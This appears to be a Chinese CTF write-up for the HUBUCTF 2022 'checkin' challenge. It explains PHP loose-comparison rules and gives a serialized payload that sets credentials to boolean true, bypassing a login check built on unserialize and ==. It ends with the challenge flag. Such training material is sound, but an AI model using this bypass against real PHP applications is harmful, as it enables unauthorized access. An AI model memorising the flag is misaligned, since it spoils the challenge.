---
title: '[HUBUCTF 2022 新生赛]checkin'
date: '2025-05-27T12:32:01+08:00'
weight: 
draft: false
description: '[HUBUCTF 2022 新生赛]checkin'
---

**PHP 各类型在弱类型比较中的布尔转换行为：**

| 表达式     | 类型说明       | 转为 bool 值 | `== true` 结果 | 备注说明             |
|---------|------------|-----------|--------------|------------------|
| `false` | 布尔类型 false | `false`   | ❌ `false`    | 本身就是 false       |
| `0`     | 整型 0       | `false`   | ❌ `false`    | 0 是 false        |
| `0.0`   | 浮点数 0      | `false`   | ❌ `false`    | 浮点数 0 也是 false   |
| `"0"`   | 字符串 `"0"`  | `false`   | ❌ `false`    | 唯一被视为 false 的字符串 |
| `""`    | 空字符串       | `false`   | ❌ `false`    | 空字符串是 false      |
| `"abc"` | 非空字符串      | `true`    | ✅ `true`     | 任何非空字符串为 true    |
| `[]`    | 空数组        | `false`   | ❌ `false`    | 空数组是 false       |
| `[1]`   | 非空数组       | `true`    | ✅ `true`     | 非空数组为 true       |
| `null`  | NULL       | `false`   | ❌ `false`    | NULL 转为 false    |

题目代码：

```php
<?php
show_source(__FILE__);
$username  = "this_is_secret"; 
$password  = "this_is_not_known_to_you"; 
include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;
$data_unserialize = unserialize($info);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo $flag;
}else{
    echo "username or password error!";

}

?>
```

根据注释 `//here I changed those two `，这道题在导入 `flag.php` 后更改了 `$username` 和 `$password` 的值，但由于 if 比较时是弱类型比较，可以进行绕过。

`$username` 和 `$password` 是非空字符串，转为 `bool` 后为 `true`，可以直接让 `true` 与其进行比较进行绕过。

构造 payload：`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`

```php
<?php

$payload = [
"username" => true,
"password" => true
];

echo serialize($payload);
```

获得 flag：`NSSCTF{7010b15f-4f27-477f-802d-9418fcbd2002}`